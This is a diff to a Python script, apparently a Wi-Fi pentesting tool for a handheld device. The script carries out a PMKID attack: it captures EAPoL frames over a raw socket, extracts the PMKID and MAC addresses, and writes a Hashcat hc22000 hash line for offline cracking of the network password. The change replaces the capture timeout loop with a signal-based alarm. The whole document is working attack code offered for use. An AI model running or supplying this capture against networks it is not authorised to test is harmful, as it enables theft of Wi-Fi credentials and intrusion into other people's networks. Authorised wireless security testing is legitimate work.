@@ -1,4 +1,4 @@
-import socket, sys, os, time
+import socket, sys, os, signal
 
 os.system('echo "' + "Running capture script..." + '" > /dev/tty0')
 
@@ -20,47 +20,54 @@ pmkid = None
 mac_ap = None
 mac_cl = None
 
-start_time = time.time()
+def handle_timeout(a, b):
+    raise TimeoutError 
 
-# Attempt capture, timeout after 30 seconds
-while time.time() - start_time < 30:
-    
-    packet = rawSocket.recvfrom(2048)[0]
-    frame_body = packet
+# Attempt capture, timeout after 60 seconds
+while True:
 
-    # Offset may vary depending on AP. 2 worked when testing with a 
-    # TP-Link Archer C1200 v2.0 Router, Firmware Version 2.0.0, but 
-    # your setup may require an offset of 0, 4, 6 or something else.
-    offset = 2
-    eapol_frame = frame_body[offset:]
-    frame_num += 1
+    signal.signal(signal.SIGALRM, handle_timeout)
+    signal.alarm(60) # Timeout after 60 seconds
 
-    if frame_num == 1:
-        first_eapol_frame = eapol_frame
-        pmkid = eapol_frame[-16:].hex()
-        mac_ap = eapol_frame[4:10].hex()
+    try:
+        packet = rawSocket.recvfrom(2048)[0]
+        frame_body = packet
 
-    if frame_num == 2:
-        mac_cl = eapol_frame[4:10].hex()
-        print("\n1st EAPoL Frame:   \n"+ str(first_eapol_frame)+"\n")
-        print('\033[95m')
-        print("Possible PMKID:        ", pmkid)
-        print("SSID:                  ", essid)
-        print("MAC AP:                ", mac_ap)
-        print("MAC Client:            ", mac_cl)
-        print('\x1b[0m')
-        print("\nHashcat hc22000 format hash line:")
-        hashline = "WPA*01*"+pmkid+"*"+mac_ap+"*"+mac_cl+\
-              "*"+bytes(essid,'utf-8').hex()+"***"
-        print(hashline)
+        # Offset may vary depending on AP. 2 worked when testing with a 
+        # TP-Link Archer C1200 v2.0 Router, Firmware Version 2.0.0, but 
+        # your setup may require an offset of 0, 4, 6 or something else.
+        offset = 2
+        eapol_frame = frame_body[offset:]
+        frame_num += 1
 
-        # Save hashline to hashline.txt
-        with open(
-            '/storage/roms/ports/RG353-WiFi-Pen/hashline.txt', 'w') as f:
-            f.write(hashline)
-        
+        if frame_num == 1:
+            first_eapol_frame = eapol_frame
+            pmkid = eapol_frame[-16:].hex()
+            mac_ap = eapol_frame[4:10].hex()
+
+        if frame_num == 2:
+            mac_cl = eapol_frame[4:10].hex()
+            print("\n1st EAPoL Frame:   \n"+ str(first_eapol_frame)+"\n")
+            print('\033[95m')
+            print("Possible PMKID:        ", pmkid)
+            print("SSID:                  ", essid)
+            print("MAC AP:                ", mac_ap)
+            print("MAC Client:            ", mac_cl)
+            print('\x1b[0m')
+            print("\nHashcat hc22000 format hash line:")
+            hashline = "WPA*01*"+pmkid+"*"+mac_ap+"*"+mac_cl+\
+                "*"+bytes(essid,'utf-8').hex()+"***"
+            print(hashline)
+
+            # Save hashline to hashline.txt
+            with open(
+                '/storage/roms/ports/RG353-WiFi-Pen/hashline.txt', 'w') as f:
+                f.write(hashline)
+            
+            sys.exit()
+    except TimeoutError:
+        print('\033[91m' + "\nCapture timed out!\n" + '\x1b[0m')
+        print("Check SSID and try running the script again.")
         sys.exit()
-
-print("Capture timed out. Try running the script again. Make sure you " + 
-      "have the correct SSID. Not all access points are vulnerable to " +
-      "a PMKID attack.")
+    finally:
+        signal.alarm(0)
